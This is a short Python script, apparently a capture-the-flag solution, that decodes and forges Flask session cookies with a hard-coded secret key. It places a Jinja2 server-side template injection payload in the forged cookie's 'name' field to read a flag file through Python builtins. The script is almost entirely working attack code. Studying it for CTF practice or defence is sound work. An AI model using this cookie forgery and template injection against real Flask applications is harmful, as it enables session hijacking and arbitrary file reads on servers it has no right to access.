import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import random

def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)

def encode_flask_cookie(secret_key, cookie):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(cookie)


SECRET_KEY="SuperDuperSecureSecretKey1234!"

#  existing_cookie = ".eJztkjEKgDAQBL9ybB18QF5hLyJHWE0gJuKlUvy7-YdWW8xMtzeWNatFGvx0Q1of7DTTjXAYM9UouW6SirQqGkKH0mIyObozYH7c332ym10_z0mL8Ktmo0PRnfAIJ3nheQEBq8jQ.ZNPbww.FoCqn0BYI7dO1XbkJxDAlgpKmhE"
ec = ".eJwNjEEKhDAQBL8y9Dks7DWv8C4iQ2xNIOqSyV4U_-6cCrqaujGvVS3TEMcb0h3YaaYbETBUqlHquUk5pJ-iKbmUnovJzz8fTM8UPNJoGXHVagw4dCciUiMvr_yNbS6LL188L5ZMJbg.ZNPcgg.xR1TaioHQ8SxPw2aG5Ict-NBlyA"
print(decode_flask_cookie(SECRET_KEY, ec))

#  existing_cookie = ".eJzt0jEOwjAQBMCvrLa2eIBfQY8idHIusYVjI58pQpS_4w_wACSqK3Znqzt4X7JYVKO_HUQfh5uayap0vGYVU4So4YG9vhpyXVPBrF1SNkiZ0dsOWSWVC6fTfd0YEEP2CglhhOgxGZ6j83e_7yY3HqmpRfpFsqljkU3pGZrqm-cHKcjNiw.ZNPa7g.SMJZACq6Var__y7q0br9I13-cRo"
#  existing_cookie = ".eJwNzEEKgCAQBdCrDLOWDuAp2ofEUD-VJgPHFhHePVdv9z5eDxVLMPbLx9QGfMFMItjxrBADbQnbSe_9VNI75kI7mmQ1krJTqy9JlFwmDj24EVZYYn-IGvoPXGwhwQ.ZNPZVA.x5TTGuVscgq0SMt78lYBlMOLXZE"
#  cookie = decode_flask_cookie(SECRET_KEY, existing_cookie)


cookie = {}
cookie["name"] = "creez"
cookie["_user_id"] = "1"
cookie["_id"] = "1"

payload = '{{get_flashed_messages.__globals__.__builtins__.open("/home/ctf/flag.txt").read()}}'
cookie["name"] = payload

session = encode_flask_cookie(SECRET_KEY, cookie)
print(session)
